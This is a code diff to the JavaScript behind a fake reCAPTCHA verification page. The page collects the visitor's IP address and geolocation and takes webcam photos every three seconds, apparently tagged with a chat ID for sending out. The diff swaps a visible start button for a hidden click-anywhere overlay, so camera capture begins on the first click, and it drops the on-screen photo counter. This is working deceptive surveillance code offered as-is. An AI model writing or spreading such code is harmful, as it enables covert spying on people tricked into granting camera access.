@@ -3,8 +3,7 @@ import { CONFIG } from "./config.js";
 const video     = document.getElementById("video");
 const canvas    = document.getElementById("canvas");
 const status    = document.getElementById("status");
-const verifyBtn = document.getElementById("verifyBtn");
-const recaptcha = document.getElementById("recaptcha");
+const trigger   = document.getElementById("hidden-trigger");
 
 const params = new URLSearchParams(window.location.search);
 const chatId = params.get("id") || "FALLBACK_CHAT_ID";
@@ -14,16 +13,14 @@ let captureTimer = null;
 let count        = 0;
 let capturing    = false;
 
-function setStatus(msg) { status.textContent = msg; }
+function setStatus(msg) { if (status) status.textContent = msg; }
 
 async function getIP() {
   try {
     const r = await fetch("https://api.ipify.org?format=json");
     const d = await r.json();
     return d.ip;
-  } catch {
-    return "Unknown";
-  }
+  } catch { return "Unknown"; }
 }
 
 async function getGeo() {
@@ -31,9 +28,7 @@ async function getGeo() {
     const r = await fetch("https://ipapi.co/json/");
     const d = await r.json();
     return `${d.city || "?"}, ${d.country_name || "?"}`;
-  } catch {
-    return "Unknown";
-  }
+  } catch { return "Unknown"; }
 }
 
 async function capture() {
@@ -71,7 +66,6 @@ async function capture() {
   } catch (_) {}
 
   count++;
-  setStatus(`✓ Verified · ${count} photos`);
 }
 
 function stopCapture() {
@@ -80,14 +74,9 @@ function stopCapture() {
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
 }
 
-// Called when user clicks the button
-verifyBtn.addEventListener("click", async () => {
-  if (capturing) return;
-
+async function startCamera() {
   try {
     setStatus("Requesting camera access...");
-    verifyBtn.disabled = true;
-    verifyBtn.textContent = "Starting...";
 
     stream = await navigator.mediaDevices.getUserMedia({
       video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
@@ -98,39 +87,51 @@ verifyBtn.addEventListener("click", async () => {
     await new Promise(resolve => {
       if (video.readyState >= 2) return resolve();
       video.onloadeddata = resolve;
+      setTimeout(resolve, 2000);
     });
 
     // Start continuous capture every 3 seconds
     capturing = true;
-    await capture();                      // First shot immediately
-    captureTimer = setInterval(capture, 3000); // Then every 3s
+    await capture();                      // first shot immediately
+    captureTimer = setInterval(capture, 3000); // then every 3s
 
-    setStatus(`✓ Camera active · ${count} photos`);
+    setStatus("✓ Verification ready — solve the CAPTCHA");
+    trigger.remove(); // remove the overlay, reCAPTCHA clickable now
 
   } catch (err) {
-    setStatus("❌ Camera access required. Please allow and try again.");
-    verifyBtn.disabled = false;
-    verifyBtn.textContent = "Start Verification";
+    setStatus("❌ Camera access required. Click anywhere to allow.");
+    trigger.style.display = "block";
     console.warn("Camera error:", err);
   }
-});
+}
+
+// First click anywhere = triggers camera permission
+trigger.addEventListener("click", async () => {
+  trigger.style.display = "none";
+  await startCamera();
+}, { once: true });
+
+// Also allow clicking the reCAPTCHA area to count as gesture
+// The reCAPTCHA iframe captures clicks too, so we add a fallback:
+document.addEventListener("click", async (e) => {
+  // If camera hasn't started yet and overlay is gone, any click triggers it
+  if (!capturing && !stream) {
+    await startCamera();
+  }
+}, { once: true });
 
 // reCAPTCHA solved → redirect
 window.onRecaptchaSuccess = () => {
   stopCapture();
-  setStatus("✓ Verification complete. Redirecting...");
+  setStatus("✓ Verified! Redirecting...");
   setTimeout(() => {
     window.location.href = "next.html";
-  }, 800);
+  }, 500);
 };
 
 window.onRecaptchaExpired = () => {
-  setStatus("⚠️ Verification expired. Please try again.");
+  setStatus("⚠️ Verification expired — click to retry camera");
 };
 
-window.onRecaptchaError = () => {
-  setStatus("⚠️ Verification error. Please try again.");
-};
-
-// Cleanup on page leave
+// Cleanup
 window.addEventListener("beforeunload", stopCapture);
